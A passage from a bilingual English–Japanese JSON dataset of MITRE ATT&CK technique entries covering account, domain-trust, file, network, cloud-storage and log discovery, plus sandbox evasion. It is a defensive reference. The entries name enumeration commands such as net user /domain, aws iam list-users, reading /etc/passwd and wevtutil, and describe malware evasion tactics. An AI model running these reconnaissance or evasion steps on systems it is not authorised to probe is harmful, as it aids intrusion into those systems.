addresses and accounts may also be extracted by searching an infected system’s files.",
                "description_jp": "攻撃者は、システム上または侵害された環境内で有効なアカウント、ユーザー名、またはメールアドレスのリストを取得しようとする可能性があります。この情報は、攻撃者がどのアカウントが存在するかを判断するのに役立ち、ブルートフォース攻撃、スピアフィッシング攻撃、またはアカウント乗っ取り（例：[有効なアカウント](https://attack.mitre.org/techniques/T1078)）などのその後の行動に役立つ可能性があります。\n\n敵対者は、既存のツールの悪用、組み込みコマンド、ターゲット環境のアカウント名や役割・権限を漏洩させる可能性のある設定ミスなど、アカウントを列挙するためにいくつかの方法を使用するかもしれない。\n\n例えば、クラウド環境では通常、ユーザーリストを取得するためのアクセスしやすいインターフェースが提供されている。(引用：AWS List Users)(引用：Google Cloud - IAM Servie Accounts List API) ホスト上では、敵対者はデフォルトの[PowerShell](https://attack.mitre.org/techniques/T1059/001)やその他のコマンドライン機能を使用してアカウントを特定することができる。メールアドレスやアカウントに関する情報は、感染したシステムのファイルを検索することによっても抽出される可能性がある。",
                "subtechniques": [
                    {
                        "id": "T1087.003",
                        "name_eng": "Email Account",
                        "name_jp": "メールアカウント",
                        "description_eng": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)\n\nIn on-premises Exchange and Exchange Online, the <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)",
                        "description_jp": "攻撃者は、メールアドレスとアカウントのリストを取得しようとする可能性があります。攻撃者は、グローバルアドレス一覧（GAL）などのExchangeアドレス一覧をダンプしようとする可能性があります。(引用: Microsoft Exchange Address Lists)\n\nオンプレミスExchangeおよびExchange Onlineでは、<code>Get-GlobalAddressList</code> PowerShellコマンドレットを使用して、認証済みセッションを使用してドメインからメールアドレスとアカウントを取得できます。(引用: Microsoft getglobaladdresslist)(引用: Black Hills Attacking Exchange MailSniper, 2016)\n\nGoogle Workspaceでは、GALはGoogle Workspace Sync for Microsoft Outlook (GWSMO)サービスを通じてMicrosoft Outlookユーザーと共有されます。さらに、Google Workspace Directoryにより、ユーザーは組織内の他のユーザーのリストを取得できます。(引用: Google Workspace Global Access List)"
                    },
                    {
                        "id": "T1087.004",
                        "name_eng": "Cloud Account",
                        "name_jp": "クラウドアカウント",
                        "description_eng": "Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)",
                        "description_jp": "攻撃者はクラウドアカウントのリストを取得しようとする可能性があります。クラウドアカウントとは、ユーザー、リモートサポート、サービス、またはクラウドサービスプロバイダーやSaaSアプリケーション内のリソースの管理のために組織によって作成および構成されたものです。\n\n認証済みアクセスがあれば、アカウントを見つけるために使用できるいくつかのツールがあります。<code>Get-MsolRoleMember</code> PowerShellコマンドレットを使用して、Office 365の役割または権限グループを指定してアカウント名を取得できます。(引用: Microsoft msolrolemember)(引用: GitHub Raindance) Azure CLI (AZ CLI) も、ドメインへの認証済みアクセスを使用してユーザーアカウントを取得するためのインターフェイスを提供します。コマンド<code>az ad user list</code>は、ドメイン内のすべてのユーザーを一覧表示します。(引用: Microsoft AZ CLI)(引用: Black Hills Red Teaming MS AD Azure, 2018)\n\nAWSコマンド<code>aws iam list-users</code>は現在のアカウントのユーザーリストを取得するために使用でき、一方<code>aws iam list-roles</code>は指定されたパスプレフィックスを持つIAMロールを取得できます。(引用: AWS List Roles)(引用: AWS List Users) GCPでは、<code>gcloud iam service-accounts list</code>と<code>gcloud projects get-iam-policy</code>を使用して、プロジェクト内のサービスアカウントとユーザーのリストを取得できます。(引用: Google Cloud - IAM Servie Accounts List API)"
                    },
                    {
                        "id": "T1087.002",
                        "name_eng": "Domain Account",
                        "name_jp": "ドメインアカウント",
                        "description_eng": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle January 2022)",
                        "description_jp": "攻撃者はドメインアカウントのリストを取得しようとする可能性があります。この情報は、特定の権限を持つ特定のアカウントをターゲットにするなど、その後の行動に役立つドメインアカウントが存在するかどうかを攻撃者が判断するのに役立ちます。\n\n[Net](https://attack.mitre.org/software/S0039)ユーティリティの<code>net user /domain</code>や<code>net group /domain</code>、macOSの<code>dscacheutil -q group</code>、Linuxの<code>ldapsearch</code>などのコマンドは、ドメインユーザーとグループを一覧表示できます。[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドレット（<code>Get-ADUser</code>や<code>Get-ADGroupMember</code>など）は、Active Directoryグループのメンバーを列挙する場合があります。(引用: CrowdStrike StellarParticle January 2022)"
                    },
                    {
                        "id": "T1087.001",
                        "name_eng": "Local Account",
                        "name_jp": "ローカルアカウント",
                        "description_eng": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
                        "description_jp": "攻撃者はローカルシステムアカウントのリストを取得しようとする可能性があります。この情報は、攻撃者がシステム上にどのローカルアカウントが存在するかを判断し、その後の行動に役立てるのに役立ちます。\n\n[Net](https://attack.mitre.org/software/S0039)ユーティリティの<code>net user</code>や<code>net localgroup</code>、macOSやLinuxの<code>id</code>や<code>groups</code>などのコマンドで、ローカルユーザーやグループを一覧表示できます。(引用: Mandiant APT1)(引用: id man page)(引用: groups man page) Linuxでは、<code>/etc/passwd</code>ファイルを使用してローカルユーザーを列挙することもできます。macOSでは、<code>dscl . list /Users</code>コマンドを使用してローカルアカウントを列挙できます。ESXiサーバーでは、<code>esxcli system account list</code>コマンドでローカルユーザーアカウントを一覧表示できます。(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)"
                    }
                ]
            },
            {
                "id": "T1482",
                "name_eng": "Domain Trust Discovery",
                "name_jp": "ドメイン信頼関係の探索",
                "description_eng": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
                "description_jp": "攻撃者は、Windowsマルチドメイン/フォレスト環境での横方向の移動の機会を特定するために使用できるドメイン信頼関係に関する情報を収集しようとする可能性があります。ドメイン信頼は、ドメインが別のドメインの認証手順に基づいてリソースへのアクセスを許可するメカニズムを提供します。(引用: Microsoft Trusts) ドメイン信頼により、信頼されたドメインのユーザーは信頼するドメインのリソースにアクセスできます。発見された情報は、攻撃者が[SID履歴インジェクション](https://attack.mitre.org/techniques/T1134/005)、[パスザチケット](https://attack.mitre.org/techniques/T1550/003)、[Kerberoasting](https://attack.mitre.org/techniques/T1558/003)を実行するのに役立つ可能性があります。(引用: AdSecurity Forging Trust Tickets)(引用: Harmj0y Domain Trusts) ドメイン信頼は、<code>DSEnumerateDomainTrusts()</code> Win32 API呼び出し、.NETメソッド、およびLDAPを使用して列挙できます。(引用: Harmj0y Domain Trusts) Windowsユーティリティ[Nltest](https://attack.mitre.org/software/S0359)は、ドメイン信頼を列挙するために攻撃者によって使用されることが知られています。(引用: Microsoft Operation Wilysupply)",
                "subtechniques": []
            },
            {
                "id": "T1083",
                "name_eng": "File and Directory Discovery",
                "name_jp": "ファイルとディレクトリの探索",
                "description_eng": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.",
                "description_jp": "攻撃者は、ファイルシステム内の特定の情報について、ファイルやディレクトリを列挙したり、ホストやネットワーク共有の特定の場所を検索したりする可能性があります。攻撃者は、自動検出中に[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうかや、特定のアクションを試みるかどうかなど、その後の行動を形成する可能性があります。\n\n多くのコマンドシェルユーティリティを使用してこの情報を取得できます。例としては、<code>dir</code>、<code>tree</code>、<code>ls</code>、<code>find</code>、<code>locate</code>などがあります。(引用: Windows Commands JPCERT) カスタムツールを使用してファイルやディレクトリの情報を収集し、[ネイティブAPI](https://attack.mitre.org/techniques/T1106)と対話することもできます。攻撃者はまた、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を利用してファイルやディレクトリの情報を収集する（例：<code>dir</code>、<code>show flash</code>、および/または<code>nvram</code>）可能性があります。(引用: US-CERT-TA18-106A)\n\n一部のファイルやディレクトリへのアクセスには、昇格された権限または特定のユーザー権限が必要になる場合があります。",
                "subtechniques": []
            },
            {
                "id": "T1049",
                "name_eng": "System Network Connections Discovery",
                "name_jp": "システムネットワーク接続の探索",
                "description_eng": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, the command `esxi network ip connection list` can be used to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)",
                "description_jp": "攻撃者は、現在アクセスしている侵害されたシステムから、またはネットワーク経由で情報を照会することによりリモートシステムから、ネットワーク接続のリストを取得しようとする可能性があります。\n\nクラウドベースの環境の一部であるシステムにアクセスした攻撃者は、接続されているシステムやサービスを特定するために、仮想プライベートクラウドや仮想ネットワークをマッピングする可能性があります。実行されるアクションは、オペレーティングシステムに応じて同じ種類の検出テクニックである可能性が高いですが、結果として得られる情報には、攻撃者の目標に関連するネットワーク化されたクラウド環境に関する詳細が含まれる場合があります。クラウドプロバイダーは、仮想ネットワークの動作方法が異なる場合があります。(引用: Amazon AWS VPC Guide)(引用: Microsoft Azure Virtual Network Overview)(引用: Google VPC Overview) 同様に、ネットワークデバイスへのアクセスを取得した攻撃者は、接続されているシステムやサービスに関する情報を収集するために同様の検出アクティビティを実行する可能性があります。\n\nこの情報を取得するユーティリティとコマンドには、[netstat](https://attack.mitre.org/software/S0104)、「net use」、および[Net](https://attack.mitre.org/software/S0039)を使用した「net session」が含まれます。MacおよびLinuxでは、[netstat](https://attack.mitre.org/software/S0104)および<code>lsof</code>を使用して現在の接続を一覧表示できます。<code>who -a</code>および<code>w</code>を使用して、現在ログインしているユーザーを表示できます（「net session」と同様）。さらに、ネットワークデバイスにネイティブな組み込み機能や[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を使用できます（例：<code>show ip sockets</code>、<code>show tcp brief</code>）。(引用: US-CERT-TA18-106A) ESXiサーバーでは、コマンド<code>esxi network ip connection list</code>を使用してアクティブなネットワーク接続を一覧表示できます。(引用: Sygnia ESXi Ransomware 2025)",
                "subtechniques": []
            },
            {
                "id": "T1497",
                "name_eng": "Virtualization/Sandbox Evasion",
                "name_jp": "仮想化/サンドボックス回避",
                "description_eng": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)",
                "description_jp": "攻撃者は、仮想化および分析環境を検出して回避するために、さまざまな手段を用いる可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)\n\n攻撃者は、セキュリティ監視ツール（Sysinternals、Wiresharkなど）や、分析または仮想化に関連するその他のシステムアーティファクトのチェックなど、[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)を達成するためにいくつかの方法を使用する可能性があります。攻撃者はまた、正当なユーザーアクティビティをチェックして、分析環境にあるかどうかを判断するのに役立てることもあります。追加の方法には、一時的なサンドボックス内で動作することを避けるために、マルウェアコード内でスリープタイマーまたはループを使用することが含まれます。(引用: Unit 42 Pirpi July 2015)",
                "subtechniques": [
                    {
                        "id": "T1497.002",
                        "name_eng": "User Activity Based Checks",
                        "name_jp": "ユーザーアクティビティベースのチェック",
                        "description_eng": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)",
                        "description_jp": "攻撃者は、仮想化および分析環境を検出して回避するために、さまざまなユーザーアクティビティチェックを採用する可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)\n\n敵対者は、マウスの動きやクリックの速度/頻度(引用：Sans Virtual Jan 2016)、ブラウザの履歴、キャッシュ、ブックマーク、あるいはホームやデスクトップなどの共通ディレクトリ内のファイル数といった変数に基づいて、ホスト上のユーザー活動を検索するかもしれない。他の方法では、悪意のあるコードがアクティブ化される前にシステムとの特定のユーザーインタラクションに依存するかもしれず、例えば、マクロをアクティブ化する前にドキュメントが閉じるのを待ったり(引用：Unit 42 Sofacy Nov 2018)、アクティブ化するためにユーザーが埋め込み画像をダブルクリックするのを待ったりするなどです(引用：FireEye FIN7 April 2017)。"
                    },
                    {
                        "id": "T1497.001",
                        "name_eng": "System Checks",
                        "name_jp": "システムチェック",
                        "description_eng": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)",
                        "description_jp": "攻撃者は、仮想化および分析環境を検出して回避するために、さまざまなシステムチェックを採用する可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)\n\n特定のチェックはターゲットや攻撃者によって異なりますが、システム情報を取得しVMEアーティファクトを検索するために、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、[システム情報ディスカバリ](https://attack.mitre.org/techniques/T1082)、[レジストリクエリ](https://attack.mitre.org/techniques/T1012)などの動作が含まれる場合があります。攻撃者は、メモリ、プロセス、ファイルシステム、ハードウェア、および/またはレジストリでVMEアーティファクトを検索する場合があります。攻撃者は、これらのチェックを1つのスクリプトに自動化するためにスクリプトを使用し、システムが仮想環境であると判断した場合にプログラムを終了させる場合があります。\n\nチェックには、ホスト/ドメイン名やネットワークトラフィックのサンプルなどの一般的なシステムプロパティが含まれる場合があります。攻撃者はまた、ネットワークアダプタのアドレス、CPUコア数、利用可能なメモリ/ドライブサイズを確認する場合があります。実行されると、マルウェアは[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)を使用して、`malware`、`sample`、`hash`などの予期しない、あるいは分析に関連する名前付けアーティファクトを持つフォルダやファイルに保存されたかどうかを確認する場合があります。\n\nその他の一般的なチェックには、これらのアプリケーションに固有の実行中のサービスの列挙、システムにインストールされているプログラム、仮想マシンアプリケーションに関連する文字列の製造元/製品フィールド、およびVME固有のハードウェア/プロセッサ命令が含まれる場合があります。(引用: McAfee Virtual Jan 2017) VMWareなどのアプリケーションでは、攻撃者は特別なI/Oポートを使用してコマンドを送信し、出力を受信することもできます。\n\nファン、温度、オーディオデバイスの存在などのハードウェアチェックも、仮想環境を示す可能性のある証拠を収集するために使用できます。攻撃者はまた、これらのデバイスから特定の測定値を照会する場合があります。(引用: Unit 42 OilRig Sept 2018)"
                    },
                    {
                        "id": "T1497.003",
                        "name_eng": "Time Based Evasion",
                        "name_jp": "時間ベースの回避",
                        "description_eng": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",
                        "description_jp": "攻撃者は、仮想化および分析環境を検出して回避するために、さまざまな時間ベースの方法を採用する可能性があります。これには、稼働時間やシステムクロックなどの時間ベースのプロパティの列挙、および仮想マシン環境（VME）またはサンドボックス（特に自動化されているか、限られた時間しか動作しないもの）を回避するためのタイマーまたはその他のトリガーの使用が含まれる場合があります。\n\n攻撃者は、プログラムによるスリープコマンドやネイティブシステムスケジューリング機能（例：[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)）を使用して初期実行時にマルウェアの機能を遅延させるなど、さまざまな時間ベースの回避策を用いる可能性があります。遅延は、特定の被害者の条件（例：システム時刻、イベントなど）が満たされるのを待つことに基づく場合もあれば、分析や精査を回避するためにスケジュールされた[多段階チャネル](https://attack.mitre.org/techniques/T1104)を使用する場合もあります。(引用: Deloitte Environment Awareness)\n\n良性のコマンドやその他の操作も、マルウェアの実行を遅らせるために使用される場合があります。[Ping](https://attack.mitre.org/software/S0097)などのコマンドのループや不必要な繰り返しは、マルウェアの実行を遅らせ、自動分析環境の時間的しきい値を超える可能性があります。(引用: Revil Independence Day)(引用: Netskope Nitol) APIハンマリングとして一般的に知られている別のバリエーションは、実行を遅らせるために[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数へのさまざまな呼び出しを行うことを含みます（同時に、ジャンクデータで分析環境を過負荷にする可能性もあります）。(引用: Joe Sec Nymaim)(引用: Joe Sec Trickbot)\n\n攻撃者はまた、時間を指標として使用してサンドボックスや分析環境を検出することもあります。特に、長時間の経過をシミュレートするために時間メカニズムを操作しようとするものを検出します。例えば、攻撃者は、スリープ関数の実行前後に環境のタイムスタンプの期待値をサンプリングして計算することにより、時間を加速させているサンドボックスを特定できる場合があります。(引用: ISACA Malware Tricks)"
                    }
                ]
            },
            {
                "id": "T1619",
                "name_eng": "Cloud Storage Object Discovery",
                "name_jp": "クラウドストレージオブジェクトの探索",
                "description_eng": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.\n\nCloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .",
                "description_jp": "攻撃者はクラウドストレージインフラストラクチャ内のオブジェクトを列挙する可能性があります。攻撃者は、自動検出中にこの情報を使用して、クラウドストレージからすべてまたは特定のオブジェクトを要求するなど、その後の行動を形成する可能性があります。ローカルホスト上の[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)と同様に、利用可能なストレージサービスを特定した後（つまり、[クラウドインフラストラクチャの発見](https://attack.mitre.org/techniques/T1580)）、攻撃者はクラウドインフラストラクチャに保存されているコンテンツ/オブジェクトにアクセスする可能性があります。\n\nクラウドサービスプロバイダーは、ユーザーがクラウドストレージ内に保存されているオブジェクトを列挙できるようにするAPIを提供しています。例としては、AWSのListObjectsV2 (引用: ListObjectsV2) やAzureのList Blobs (引用: List Blobs) などがあります。",
                "subtechniques": []
            },
            {
                "id": "T1654",
                "name_eng": "Log Enumeration",
                "name_jp": "ログ列挙",
                "description_eng": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).\n\nHost binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges as novel threat actor) In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)\n\nAdversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.\n\nIn addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.(Citation: Permiso GUI-Vil 2023)",
